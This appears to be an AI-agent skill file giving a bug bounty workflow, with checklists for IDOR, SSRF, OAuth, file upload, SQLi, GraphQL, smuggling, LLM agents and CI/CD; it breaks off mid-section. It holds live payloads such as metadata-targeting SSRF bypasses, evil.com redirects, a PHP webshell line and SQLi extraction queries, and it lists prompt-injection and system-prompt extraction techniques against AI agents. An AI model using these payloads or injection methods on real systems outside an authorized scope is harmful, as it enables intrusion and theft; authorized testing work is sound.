# Bug Bounty Master Workflow

Full pipeline: Recon -> Learn -> Hunt -> Validate -> Report. One skill for everything.

## THE ONLY QUESTION THAT MATTERS

> **"Can an attacker do this RIGHT NOW against a real user who has taken NO unusual actions -- and does it cause real harm (stolen money, leaked PII, account takeover, code execution)?"**
>
> If the answer is NO -- **STOP. Do not write. Do not explore further. Move on.**

### Theoretical Bug = Wasted Time. Kill These Immediately:

| Pattern | Kill Reason |
|---|---|
| "Could theoretically allow..." | Not exploitable = not a bug |
| "An attacker with X, Y, Z conditions could..." | Too many preconditions |
| "Wrong implementation but no practical impact" | Wrong but harmless = not a bug |
| Dead code with a bug in it | Not reachable = not a bug |
| Source maps without secrets | No impact |
| SSRF with DNS-only callback | Need data exfil or internal access |
| Open redirect alone | Need ATO or OAuth chain |
| "Could be used in a chain if..." | Build the chain first, THEN report |

**You must demonstrate actual harm. "Could" is not a bug. Prove it works or drop it.**

---

## CRITICAL RULES

1. **READ FULL SCOPE FIRST** -- verify every asset/domain is owned by the target org
2. **NO THEORETICAL BUGS** -- "Can an attacker steal funds, leak PII, takeover account, or execute code RIGHT NOW?" If no, STOP.
3. **KILL WEAK FINDINGS FAST** -- run the 7-Question Gate BEFORE writing any report
4. **Validate before writing** -- check CHANGELOG, design docs, deployment scripts FIRST
5. **One bug class at a time** -- go deep, don't spray
6. **Verify data isn't already public** -- check web UI in incognito before reporting API "leaks"
7. **5-MINUTE RULE** -- if a target shows nothing after 5 min probing (all 401/403/404), MOVE ON
8. **IMPACT-FIRST HUNTING** -- ask "what's the worst thing if auth was broken?" If nothing valuable, skip target
9. **CREDENTIAL LEAKS need exploitation proof** -- finding keys isn't enough, must PROVE what they access
10. **STOP SHALLOW RECON SPIRALS** -- don't probe 403s, don't grep for analytics keys, don't check staging domains that lead nowhere
11. **BUSINESS IMPACT over vuln class** -- severity depends on CONTEXT, not just vuln type
12. **UNDERSTAND THE TARGET DEEPLY** -- before hunting, learn the app like a real user
13. **DON'T OVER-RELY ON AUTOMATION** -- automated scans hit WAFs, trigger rate limits, find the same bugs everyone else finds
14. **HUNT LESS-SATURATED VULN CLASSES** -- XSS/SSRF/XXE have the most competition. Expand into: cache poisoning, Android/mobile vulns, business logic, race conditions, OAuth/OIDC chains, CI/CD pipeline attacks
15. **ONE-HOUR RULE** -- stuck on one target for an hour with no progress? SWITCH CONTEXT
16. **TWO-EYE APPROACH** -- combine systematic testing (checklist) with anomaly detection (watch for unexpected behavior)
17. **T-SHAPED KNOWLEDGE** -- go DEEP in one area and BROAD across everything else
18. **LEAD BOARD — never lose a lead** -- after recon run `python3 ~/tools/claude-bug-bounty/tools/lead_board.py ingest <target>` + `show` + `next`. Route each signal to its skill ("GraphQL → hunt-graphql"). `touch` when starting/killing/reporting. Focus on one lead; the board remembers the rest. Surface stale high-priority leads unprompted.

> **For the full hunting methodology** — 5-phase non-linear workflow, developer psychology framework, session discipline, tool routing by phase, and Wide/Deep route selection — see **`skills/bb-methodology/SKILL.md`**.
>
> **Tool catalogue:** `~/tools/claude-bug-bounty/tools/README.md` (~50 tools). Orchestrator: `python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T` (auto lead ingest; add `--graphql` / `--cve-hunt` as needed).
>
> **Tech CVE intel = `skills/tech-cve-intel/SKILL.md`** — whenever a technology version is detected (httpx -tech-detect, nmap -sV, headers, JS libs), run `python3 ~/.config/opencode/skills/tech-cve-intel/scripts/tech_cve_intel.py --from-file <versions>` to get NVD/GitHub/EOL intel. See `skills/tech-cve-intel/references/high-value-cves.md` for the always-check shortlist.
>
> **Custom scanners = `skills/custom-scanner-kit/SKILL.md`** — when a target needs a one-off Python script that `ffuf`/`nuclei`/`sqlmap`/`dalfox` can't express (multi-step authz / cross-account IDOR / race windows / signature-reversed calls / bespoke probes). Scaffold with `python3 ~/.config/opencode/skills/custom-scanner-kit/scripts/scanplate.py --name <x> --out .`, then add the logic from `references/pattern-library.md` (IDOR two-token diff, BFLA sibling sweep, GraphQL node() IDOR, race gather, adaptive timing, interactsh OOB, secret regex). It's pre-wired with the bb-common scope gate, Caido proxy, rate limiting/retry, baseline-anchored diff, and secret redaction.
>
> **Shared safety/util layer = `skills/bb-common/SKILL.md`** — the fail-closed cause on EVERY workflow: (1) `safe_scope.py` blocks any request whose target isn't in an authorized scope file (and aborts if scope is missing/ambiguous), (2) `capabilities.py` dynamically detects installed tools (skip missing ones, don't assume paths), (3) `bb_common.py` gives retry/backoff, timeouts, caching, dedup, concurrency, and secret-redacting logging. Consult it before any outbound request, and before running a scan pipeline to confirm tool availability.
>
> **Environment facts (verified):** `~/tools/claude-bug-bounty/ENVIRONMENT.md` — proxy = Caido `http://127.0.0.1:8081` (UI :8080), probing httpx = `~/go/bin/httpx`, wordlists in `~/tools/claude-bug-bounty/wordlists`.
>
> **Caido control = `skills/caido/SKILL.md`** — headless instance start, GraphQL history search (HTTPQL), replay, findings, scope, intercept. Route all important requests through the proxy; pre-flight: `pgrep -f caido-cli || nohup caido-cli --proxy-listen 0.0.0.0:8081 --ui-listen 127.0.0.1:8080 > /tmp/caido.log 2>&1 &`

## AUTH-AWARE HUNTING (when bugs live behind a login)

Anonymous recon misses the bugs that pay most. IDOR, BOLA, mass-assignment,
privilege escalation, auth bypass, SSRF behind login, and most LLM/agent
bugs are invisible until you log in. Load auth **once** at session start and
every downstream tool (httpx, katana, ffuf, nuclei, dalfox, the SQLi / SSTI
/ upload PoC verifiers) sends those headers automatically.

```bash
# Pick ONE of these and run hunt.py normally:
python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T --cookie 'session=eyJabc...'
python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T --bearer 'eyJhbGciOi...'
python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T --auth-file .private/T.json

# Or via env (persists for the shell):
export BBHUNT_COOKIE='session=eyJabc...'
python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T
```

**For IDOR / BOLA hunts**, load two sessions and diff behavior:

```bash
python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T --auth-file .private/T-user-a.json
python3 ~/tools/claude-bug-bounty/tools/hunt.py --target T --auth-file .private/T-user-b.json
# Audit log entries carry different session_id hashes → diff which
# endpoints behaved differently per identity.
```

**Safety**: cookies/tokens never appear in logs, hunt-memory, or `repr()`.
Only a 12-char `session_id` hash is recorded. `.private/` is gitignored.
MFA-skip and SAML signature-stripping probes deliberately stay anonymous —
that's the attack they're checking for.

## A->B BUG SIGNAL METHOD (Cluster Hunting)

**When you find bug A, systematically hunt for B and C nearby.** This is one of the most powerful methodologies in bug bounty. Single bugs pay. Chains pay 3-10x more.

### Known A->B->C Chains

| Bug A (Signal) | Hunt for Bug B | Escalate to C |
|----------------|---------------|---------------|
| IDOR (read) | PUT/DELETE on same endpoint | Full account data manipulation |
| SSRF (any) | Cloud metadata 169.254.169.254 | IAM credential exfil -> RCE |
| XSS (stored) | Check if HttpOnly is set on session cookie | Session hijack -> ATO |
| Open redirect | OAuth redirect_uri accepts your domain | Auth code theft -> ATO |
| S3 bucket listing | Enumerate JS bundles | Grep for OAuth client_secret -> OAuth chain |
| Rate limit bypass | OTP brute force | Account takeover |
| GraphQL introspection | Missing field-level auth | Mass PII exfil |
| Debug endpoint | Leaked environment variables | Cloud credential -> infrastructure access |
| CORS reflects origin | Test with credentials: include | Credentialed data theft |
| Host header injection | Password reset poisoning | ATO via reset link |

### Cluster Hunt Protocol (6 Steps)

```
1. CONFIRM A     Verify bug A is real with an HTTP request
2. MAP SIBLINGS  Find all endpoints in the same controller/module/API group
3. TEST SIBLINGS Apply the same bug pattern to every sibling
4. CHAIN         If sibling has different bug class, try combining A + B
5. QUANTIFY      "Affects N users" / "exposes $X value" / "N records"
6. REPORT        One report per chain (not per bug). Chains pay more.
```

### Real Examples

**Coinbase S3->Bundle->Secret->OAuth chain:**
```
A: S3 bucket publicly listable (Low alone)
B: JS bundles contain OAuth client credentials
C: OAuth flow missing PKCE enforcement
Result: Full auth code interception chain
```

**Vienna Chatbot chain:**
```
A: Debug parameter active in production (Info alone)
B: Chatbot renders HTML in response (dangerouslySetInnerHTML)
C: Stored XSS via bot response visible to other users
Result: P2 finding with real impact
```

# TOP 1% HACKER MINDSET

## How Elite Hackers Think Differently

**Average hunter**: Runs tools, checks checklist, gives up after 30 min.
**Top 1%**: Builds a mental model of the app's internals. Asks "why does this work the way it does?" Not "what does this endpoint do?" but "what business decision led a developer to build it this way, and what shortcut might they have taken?"

## Pre-Hunt Mental Framework

### Step 1: Crown Jewel Thinking
Before touching anything, ask: "If I were the attacker and I could do ONE thing to this app, what causes the most damage?"
- Financial app -> drain funds, transfer to attacker account
- Healthcare -> PII leak, HIPAA violation
- SaaS -> tenant data crossing, admin takeover
- Auth provider -> full SSO chain compromise

### Step 2: Developer Empathy
Think like the developer who built the feature:
- What was the simplest implementation?
- What shortcut would a tired dev take at 2am?
- Where is auth checked -- controller? middleware? DB layer?
- What happens when you call endpoint B without going through endpoint A first?

### Step 3: Trust Boundary Mapping
```
Client -> CDN -> Load Balancer -> App Server -> Database
         ^               ^              ^
    Where does app STOP trusting input?
    Where does it ASSUME input is already validated?
```

### Step 4: Feature Interaction Thinking
- Does this new feature reuse old auth, or does it have its own?
- Does the mobile API share auth logic with the web app?
- Was this feature built by the same team or a third-party?

## The Top 1% Mental Checklist
- [ ] I know the app's core business model
- [ ] I've used the app as a real user for 15+ minutes
- [ ] I know the tech stack (language, framework, auth system, caching)
- [ ] I've read at least 3 disclosed reports for this program
- [ ] I have 2 test accounts ready (attacker + victim)
- [ ] I've defined my primary target: ONE crown jewel I'm hunting for today

## Mindset Rules from Top Hunters

**"Hunt the feature, not the endpoint"** -- Find all endpoints that serve a feature, then test the INTERACTION between them.

**"Authorization inconsistency is your friend"** -- If the app checks auth in 9 places but not the 10th, that's your bug.

**"New == unreviewed"** -- Features launched in the last 30 days have lowest security maturity.

**"Think second-order"** -- Second-order SSRF: URL saved in DB, fetched by cron job. Second-order XSS: stored clean, rendered unsafely in admin panel.

**"Follow the money"** -- Any feature touching payments, billing, credits, refunds is where developers make the most security shortcuts.

**"The API the mobile app uses"** -- Mobile apps often call older/different API versions. Same company, different attack surface, lower maturity.

**"Diffs find bugs"** -- Compare old API docs vs new. Compare mobile API vs web API. Compare what a free user can request vs what a paid user gets in response.

```

## AI-Assisted Tools
- **strix** (usestrix.com) -- open-source AI scanner for automated initial sweep

## AI-ASSISTED HUNT LOOP

Use AI as a second analyst, not as the authority.

1. **Decompose the feature** — ask for actors, assets, trust boundaries, hidden state, and sibling endpoints.
2. **Generate the test matrix** — anonymous vs authenticated, user A vs user B, fresh vs stale session, web vs mobile, legacy vs current API.
3. **Ask for developer shortcuts** — where a rushed implementation would likely skip a check, reuse a helper, or trust a client-side value.
4. **Ask for adjacent bugs** — if A is real, what B and C are likely nearby?
5. **Convert every idea into one request** — the output must be a concrete HTTP experiment or it stays speculation.
6. **Proof first, report later** — AI can rank hypotheses, but only live request/response diffs and cross-account deltas can promote a finding.

Good prompt shapes:
- "Given this feature, list the 10 most likely trust-boundary mistakes."
- "What sibling routes, methods, or roles should I test next?"
- "What would a tired developer probably reuse here?"
- "What is the smallest reproducible request that could prove impact?"
- "What evidence would downgrade this to N/A?"

## Technology Fingerprinting

| Signal | Technology |
|---|---|
| Cookie: `XSRF-TOKEN` + `*_session` | Laravel |
| Cookie: `PHPSESSID` | PHP |
| Header: `X-Powered-By: Express` | Node.js/Express |
| Response: `wp-json`/`wp-content` | WordPress |
| Response: `{"errors":[{"message":` | GraphQL |
| Header: `X-Powered-By: Next.js` | Next.js |

> **After any stack is identified:** immediately check its debug surface — probe the framework-specific paths from web2-vuln-classes "Error Disclosure / Debug Endpoints", then grep all 4xx/5xx response bodies for the framework regex patterns there before moving to Phase 3.

## Framework Quick Wins

**Laravel**: `/horizon`, `/telescope`, `/.env`, `/storage/logs/laravel.log`
**WordPress**: `/wp-json/wp/v2/users`, `/xmlrpc.php`, `/?author=1`
**Node.js**: `/.env`, `/graphql` (introspection), `/_debug`
**AWS Cognito**: `/oauth2/userInfo` (leaks Pool ID), CORS reflects arbitrary origins

# PHASE 2: LEARN (Pre-Hunt Intelligence)

## Read Disclosed Reports
```bash
# By program on HackerOne
curl -s "https://hackerone.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ hacktivity_items(first:25, order_by:{field:popular, direction:DESC}, where:{team:{handle:{_eq:\"PROGRAM\"}}}) { nodes { ... on HacktivityDocument { report { title severity_rating } } } } }"}' \
  | jq '.data.hacktivity_items.nodes[].report'
```

## "What Changed" Method
1. Find disclosed report for similar tech
2. Get the fix commit
3. Read the diff -- identify the anti-pattern
4. Grep your target for that same anti-pattern

## Threat Model Template
```
TARGET: _______________
CROWN JEWELS: 1.___ 2.___ 3.___
ATTACK SURFACE:
  [ ] Unauthenticated: login, register, password reset, public APIs
  [ ] Authenticated: all user-facing endpoints, file uploads, API calls
  [ ] Cross-tenant: org/team/workspace ID parameters
  [ ] Admin: /admin, /internal, /debug
HIGHEST PRIORITY (crown jewel x easiest entry):
  1.___ 2.___ 3.___
```

## 6 Key Patterns from Top Reports
1. **Feature Complexity = Bug Surface** -- imports, integrations, multi-tenancy, multi-step workflows
2. **Developer Inconsistency = Strongest Evidence** -- `timingSafeEqual` in one place, `===` elsewhere
3. **"Else Branch" Bug** -- proxy/gateway passes raw token without validation in else path
4. **Import/Export = SSRF** -- every "import from URL" feature has historically had SSRF
5. **Secondary/Legacy Endpoints = No Auth** -- `/api/v1/` guarded but `/api/` isn't
6. **Race Windows in Financial Ops** -- check-then-deduct as two DB operations = double-spend

> **Before closing any 4xx/5xx:** grep the response body for the 8 framework trace patterns in web2-vuln-classes "Error Disclosure / Debug Endpoints". A 502 body containing a Node.js stack trace is not a dead end — it is a chain entry point.

## Dead Ends (don't revisit)
- /admin -> IP restricted, confirmed by trying 15+ bypass headers

## Anomalies
- GET /api/export returns 200 even when session cookie is missing
- Response time: POST /api/check-user -> 150ms (exists) vs 8ms (doesn't)

## Rabbit Holes (time-boxed, max 15 min each)
- [ ] 10 min: JWT kid injection on auth endpoint

## Confirmed Bugs
- [15:10] IDOR on /api/invoices/{id} -- read+write
```

## Subdomain Type -> Hunt Strategy
- **dev/staging/test**: Debug endpoints, disabled auth, verbose errors
- **admin/internal**: Default creds, IP bypass headers (`X-Forwarded-For: 127.0.0.1`)
- **api/api-v2**: Enumerate with kiterunner, check older unprotected versions
- **auth/sso**: OAuth misconfigs, open redirect in `redirect_uri`
- **upload/cdn**: CORS, path traversal, stored XSS
- **403/blocked sensitive paths** (`/.env 403`, `/.git 403`, `/admin 403`): pivot to "Error Disclosure / Debug Endpoints" triggering techniques — malformed input on adjacent API endpoints (`/api/user/abc`, `{"id": null}`, `?page=9999999999`) to elicit framework stack traces without needing direct path access.

## CVE-Seeded Audit Approach
1. **Build a CVE eval set** -- collect 5-10 prior CVEs for the target codebase
2. **Reproduce old bugs** -- verify you can find the pattern in older code
3. **Pattern-match forward** -- search for the same anti-pattern in current code
4. **Focus on wide attack surfaces** -- JS engines, parsers, anything processing untrusted external input

## Rust/Blockchain Source Code (Hard-Won Lessons)

**Panic paths: encoding vs decoding** -- `.unwrap()` on an encoding path is NOT attacker-triggerable. Only panics on deserialization/decoding of network input are exploitable.

**"Known TODO" is not a mitigation** -- A comment like `// Votes are not signed for now` doesn't mean safe.

**Pattern-based hunting from confirmed findings** -- If `verify_signed_vote` is broken, check `verify_signed_proposal` and `verify_commit_signature`.

```bash
# Rust dangerous patterns (network-facing)
grep -rn "\.unwrap()\|\.expect(" --include="*.rs" | grep -v "test\|encode\|to_bytes\|serialize"
grep -rn "if let Ok\|let _ =" --include="*.rs" | grep -i "verify\|sign\|cert\|auth"
grep -rn "TODO\|FIXME\|not signed\|not verified\|for now" --include="*.rs" | grep -i "sign\|verify\|cert\|auth"
```

# VULNERABILITY HUNTING CHECKLISTS

## IDOR -- Insecure Direct Object Reference

> #1 most paid web2 class -- 30% of all submissions that get paid.

### IDOR Variants (10 Ways to Test)

| Variant | What to Test |
|---------|-------------|
| V1: Direct | Change object ID in URL path `/api/users/123` -> `/api/users/456` |
| V2: Body param | Change ID in POST/PUT JSON body `{"user_id": 456}` |
| V3: GraphQL node | `{ node(id: "base64(OtherType:123)") { ... } }` |
| V4: Batch/bulk | `/api/users?ids=1,2,3,4,5` -- request multiple IDs at once |
| V5: Nested | Change parent ID: `/orgs/{org_id}/users/{user_id}` |
| V6: File path | `/files/download?path=../other-user/file.pdf` |
| V7: Predictable | Sequential integers, timestamps, short UUIDs |
| V8: Method swap | GET returns 403? Try PUT/PATCH/DELETE on same endpoint |
| V9: Version rollback | v2 blocked? Try `/api/v1/` same endpoint |
| V10: Header injection | `X-User-ID: victim_id`, `X-Org-ID: victim_org` |

### IDOR Testing Checklist
- [ ] Create two accounts (A = attacker, B = victim)
- [ ] Log in as A, perform all actions, note all IDs in requests
- [ ] Log in as B, replay A's requests with A's IDs using B's auth
- [ ] Try EVERY endpoint with swapped IDs -- not just GET, also PUT/DELETE/PATCH
- [ ] Check API v1/v2 differences
- [ ] Check GraphQL schema for node() queries
- [ ] Check WebSocket messages for client-supplied IDs
- [ ] Test batch endpoints (can you request multiple IDs?)
- [ ] Try adding unexpected params: `?user_id=other_user`

### IDOR Chains (higher payout)
- IDOR + Read PII = Medium
- IDOR + Write (modify other's data) = High
- IDOR + Admin endpoint = Critical (privilege escalation)
- IDOR + Account takeover path = Critical
- IDOR + Chatbot (LLM reads other user's data) = High

## SSRF -- Server-Side Request Forgery

- [ ] Try cloud metadata: `http://169.254.169.254/latest/meta-data/`
- [ ] Try internal services: `http://127.0.0.1:6379/` (Redis), `:9200` (Elasticsearch), `:27017` (MongoDB)
- [ ] Test all IP bypass techniques (see table below)
- [ ] Test protocol bypass: `file://`, `dict://`, `gopher://`
- [ ] Look in: webhook URLs, import from URL, profile picture URL, PDF generators, XML parsers

### SSRF IP Bypass Table (11 Techniques)

| Bypass | Payload | Notes |
|--------|---------|-------|
| Decimal IP | `http://2130706433/` | 127.0.0.1 as single decimal |
| Hex IP | `http://0x7f000001/` | Hex representation |
| Octal IP | `http://0177.0.0.1/` | Octal 0177 = 127 |
| Short IP | `http://127.1/` | Abbreviated notation |
| IPv6 | `http://[::1]/` | Loopback in IPv6 |
| IPv6-mapped | `http://[::ffff:127.0.0.1]/` | IPv4-mapped IPv6 |
| Redirect chain | `http://attacker.com/302->http://169.254.169.254` | Check each hop |
| DNS rebinding | Register domain resolving to 127.0.0.1 | First check = external, fetch = internal |
| URL encoding | `http://127.0.0.1%2523@attacker.com` | Parser confusion |
| Enclosed alphanumeric | `http://①②⑦.⓪.⓪.①` | Unicode numerals |
| Protocol smuggling | `gopher://127.0.0.1:6379/_INFO` | Redis/other protocols |

### SSRF Impact Chain
- DNS-only = Informational (don't submit)
- Internal service accessible = Medium
- Cloud metadata readable = High (key exposure)
- Cloud metadata + exfil keys = Critical (code execution on cloud)
- Docker API accessible = Critical (direct RCE)

## OAuth / OIDC

- [ ] Missing `state` parameter -> CSRF
- [ ] `redirect_uri` accepts wildcards -> ATO
- [ ] Missing PKCE -> code theft
- [ ] Implicit flow -> token leakage in referrer
- [ ] Open redirect in post-auth redirect -> OAuth token theft chain

### Open Redirect Bypass Table (11 Techniques)

Use these when chaining open redirect into OAuth code theft:

| Bypass | Payload | Notes |
|--------|---------|-------|
| Double URL encoding | `%252F%252F` | Decodes to `//` after double decode |
| Backslash | `https://target.com\@evil.com` | Some parsers normalize `\` to `/` |
| Missing protocol | `//evil.com` | Protocol-relative |
| @-trick | `https://target.com@evil.com` | target.com becomes username |
| Protocol-relative | `///evil.com` | Triple slash |
| Tab/newline injection | `//evil%09.com` | Whitespace in hostname |
| Fragment trick | `https://evil.com#target.com` | Fragment misleads validation |
| Null byte | `https://evil.com%00target.com` | Some parsers truncate at null |
| Parameter pollution | `?next=target.com&next=evil.com` | Last value wins |
| Path confusion | `/redirect/..%2F..%2Fevil.com` | Path traversal in redirect |
| Unicode normalization | `https://evil.com/target.com` | Visual confusion |

## File Upload

### File Upload Bypass Table

| Bypass | Technique |
|--------|-----------|
| Double extension | `file.php.jpg`, `file.php%00.jpg` |
| Case variation | `file.pHp`, `file.PHP5` |
| Alternative extensions | `.phtml`, `.phar`, `.shtml`, `.inc` |
| Content-Type spoof | `image/jpeg` header with PHP content |
| Magic bytes | `GIF89a; <?php system($_GET['c']); ?>` |
| .htaccess upload | `AddType application/x-httpd-php .jpg` |
| SVG XSS | `<svg onload=alert(1)>` |
| Race condition | Upload + execute before cleanup runs |
| Polyglot JPEG/PHP | Valid JPEG that is also valid PHP |
| Zip slip | `../../etc/cron.d/shell` in filename inside archive |

### Magic Bytes Reference
| Type | Hex |
|------|-----|
| JPEG | `FF D8 FF` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` |
| GIF | `47 49 46 38` |
| PDF | `25 50 44 46` |
| ZIP/DOCX/XLSX | `50 4B 03 04` |

## Race Conditions

- [ ] Coupon codes / promo codes
- [ ] Gift card redemption
- [ ] Fund transfer / withdrawal
- [ ] Voting / rating limits
- [ ] OTP verification brute via race

```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### Turbo Intruder -- Single-Packet Attack (All Requests Arrive Simultaneously)
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           engine=Engine.BURP2)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # all 20 fire in a single TCP packet

def handleResponse(req, interesting):
    table.add(req)
```

## Business Logic
- [ ] Negative quantities in cart
- [ ] Price parameter tampering
- [ ] Workflow skip (e.g., pay without checkout)
- [ ] Role escalation via registration fields
- [ ] Privilege persistence after downgrade

## XSS -- Cross-Site Scripting

### XSS Sinks (grep for these)
```javascript
// HIGH RISK
innerHTML = userInput
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)    // string form
setInterval(userInput, ...)
new Function(userInput)

// MEDIUM RISK (context-dependent)
element.src = userInput        // JavaScript URI possible
element.href = userInput
location.href = userInput
```

### XSS Chains (escalate from Medium to High/Critical)
- XSS + sensitive page (banking, admin) = High
- XSS + CSRF token theft = CSRF bypass -> Critical action
- XSS + service worker = persistent XSS across pages
- XSS + credential theft via fake login form = ATO
- XSS in chatbot response = stored XSS chain

## SQL Injection

### Detection
```bash
# Single quote test
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--

# Error-based detection
'; SELECT 1/0--    # divide by zero error reveals SQLi
```

### Modern SQLi WAF Bypass
```sql
-- Comment variation
/*!50000 SELECT*/ * FROM users
SE/**/LECT * FROM users
-- Case variation
SeLeCt * FrOm uSeRs
-- URL encoding
%27 OR %271%27=%271
-- Unicode apostrophe
' OR '1'='1
```

### Stack → DBMS fingerprint (pick the right payload or you MISS blind/error injections)
| Tech signal | Likely DBMS | Blind probe |
|---|---|---|
| `.asp`/`.aspx`, IIS, ASP.NET error pages | MSSQL | `WAITFOR DELAY '0:0:5'--` |
| `.php`, Apache/nginx LAMP | MySQL/MariaDB | `SLEEP(5)--` |
| Java/Spring, `.jsp` | PostgreSQL / MSSQL / Oracle | `pg_sleep(5)` / `WAITFOR` / `dbms_pipe.receive_message('a',5)` |
| Python (Django/Flask), Rails | PostgreSQL / MySQL | `pg_sleep(5)` / `SLEEP(5)` |

Fingerprint early: `@@version` (MSSQL/MySQL), `version()` (PG), `SELECT banner FROM v$version` (Oracle). A wrong-DBMS payload silently fails — that's a missed bug, not a clean target.

### Where SQLi hides (test every sink, not just the search box)
- [ ] Every param from recon / `param-discover` — incl. JSON keys, `ORDER BY`/`sort=` columns (can't be parameterized → high-yield), `LIMIT`/`offset`
- [ ] Headers & cookies looked up in a query (`X-Forwarded-For`, `User-Agent`, session/auth tokens)
- [ ] Second-order: value stored on one request (profile field, filename), fires in a *later* query — plant `'`/sleep, then watch a different page render
- [ ] REST/GraphQL filters, export & report generators, autocomplete/"search" endpoints

### Confirm + prove impact (read-only — kills N/A, catches blind)
```sql
-- 1. confirm it's REAL (don't stop at one error)
' AND 1=1--  vs  ' AND 1=2--    → responses differ = boolean oracle = real
-- 2. column count, then a displayable column
' ORDER BY 1--  ↑ N until error → N-1 cols
0' UNION SELECT NULL,'MARKER',NULL--   → find where MARKER renders
-- 3. prove readable data (ONE value is enough for a valid report)
0' UNION SELECT NULL,@@version,NULL--               -- MSSQL/MySQL
0' UNION SELECT NULL,version(),NULL--               -- PostgreSQL
-- one-request dump when proving a sensitive table:
-- MySQL GROUP_CONCAT() · MSSQL/PG STRING_AGG() · Oracle LISTAGG()
```
SQLi that reads a sensitive row (e.g. a config/credentials table) **is already a valid, high-severity finding** — submit on the readable data, not a lone 500. You do not need RCE.

> **Escalation (conditional — most SQLi stops at data read).** Only if the DB account is `sysadmin`/superuser **and** host exploitation is in program scope does SQLi → OS RCE apply (MSSQL `xp_cmdshell`, PG `COPY…FROM PROGRAM`, MySQL `INTO OUTFILE`). In BBP this is usually out of scope — prove the data read, note escalation potential in Impact, and don't run it.

## GraphQL

### Introspection (alone = Informational, but reveals attack surface)
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### Missing Field-Level Auth
```graphql
# User query returns only own data
{ user(id: 1) { name email } }
# But node() bypasses per-object auth:
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }
```

### Batching Attack (Rate Limit Bypass)
```json
[
  {"query": "{ login(email: \"user@test.com\", password: \"pass1\") }"},
  {"query": "{ login(email: \"user@test.com\", password: \"pass2\") }"},
  "...100 more..."
]
```

## LLM / AI Features

- [ ] Prompt injection via user input passed to LLM
- [ ] Indirect injection via document/URL the AI processes
- [ ] IDOR in chat history (enumerate conversation IDs)
- [ ] System prompt extraction via roleplay/encoding
- [ ] RCE via code execution tool abuse
- [ ] ASCII smuggling (invisible unicode in LLM output)

### Agentic AI Hunting (OWASP ASI01-ASI10)

When target has AI agents with tool access, these are the 10 attack classes:

| ID | Vuln Class | What to Test |
|----|-----------|-------------|
| ASI01 | Prompt injection | Override system prompt via user input -- make agent ignore its rules |
| ASI02 | Tool misuse | Make AI call tools with attacker-controlled params (SSRF via "fetch URL", RCE via code tool) |
| ASI03 | Data exfil | Extract training data / PII via crafted prompts that leak context |
| ASI04 | Privilege escalation | Use AI to access admin-only tools -- agent has broader perms than user |
| ASI05 | Indirect injection | Poison document/URL the AI processes -- hidden instructions in fetched content |
| ASI06 | Excessive agency | AI takes destructive actions without confirmation -- delete, send, pay |
| ASI07 | Model DoS | Craft inputs that cause infinite loops, excessive token usage, or OOM |
| ASI08 | Insecure output | AI generates XSS/SQLi/command injection in its output that gets rendered |
| ASI09 | Supply chain | Compromised plugins/tools/MCP servers the AI calls |
| ASI10 | Sensitive disclosure | AI reveals internal configs, API keys, system prompts, user data |

**Triage rule:** ASI alone = Informational. Must chain to IDOR/exfil/RCE/ATO for paid bounty.

## Cache Poisoning / Web Cache Deception
- [ ] Test `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL` -- unkeyed headers reflected in response
- [ ] Parameter cloaking (`?param=value;poison=xss`)
- [ ] Fat GET (body params on GET requests)
- [ ] Web cache deception (`/account/settings.css` -- trick cache into storing private response)
- [ ] Param Miner equivalent -- unkeyed header discovery: fuzz `X-Origin-*`/`X-Forwarded-*`/`X-Host` variants with ffuf against a cacheable endpoint (Caido has no Param Miner)

## HTTP Request Smuggling
- [ ] CL.TE: Content-Length processed by frontend, Transfer-Encoding by backend
- [ ] TE.CL: Transfer-Encoding processed by frontend, Content-Length by backend
- [ ] H2.CL: HTTP/2 downgrade smuggling
- [ ] TE obfuscation: `Transfer-Encoding: xchunked`, tab prefix, space prefix
- [ ] Use Burp "HTTP Request Smuggler" extension -- detects automatically

### CL.TE Example
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Frontend reads Content-Length: 13 -> sends all. Backend reads Transfer-Encoding -> sees chunk "0" = end -> "SMUGGLED" left in buffer -> next user's request poisoned.

## Android / Mobile Hunting
- [ ] Certificate pinning bypass (Frida/objection)
- [ ] Exported activities/receivers (AndroidManifest.xml)
- [ ] Deep link injection
- [ ] Shared preferences / SQLite in cleartext
- [ ] WebView JavaScript bridge
- [ ] Mobile API often uses older/different API version than web

## CI/CD Pipeline — GitHub Actions Security

> **Tooling**: sisakulint is NOT installed on this machine — use the manual grep patterns below as primary. If you want the automated SAST (52 rules, 81.6% GHSA coverage), one-time install: download a release binary from the sisakulint repo, then `sisakulint scan .github/workflows/`.
>
> **Quick scan**: `sisakulint scan .github/workflows/` — flags Critical/High issues with auto-fix suggestions.
> **Remote scan**: `sisakulint scan --remote owner/repo` — scan without cloning.

### Recon: Finding Workflow Files

```bash
# Clone target's public repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint on all workflows:
sisakulint scan .github/workflows/
```

### Category 1: Code Injection & Expression Safety (CICD-SEC-04)

**Root cause**: Untrusted input (`github.event.issue.title`, `github.event.pull_request.body`, branch names, commit messages) interpolated into `run:` blocks via `${{ }}` expressions.

**Taint sources** (attacker-controlled):
```
github.event.issue.title / .body
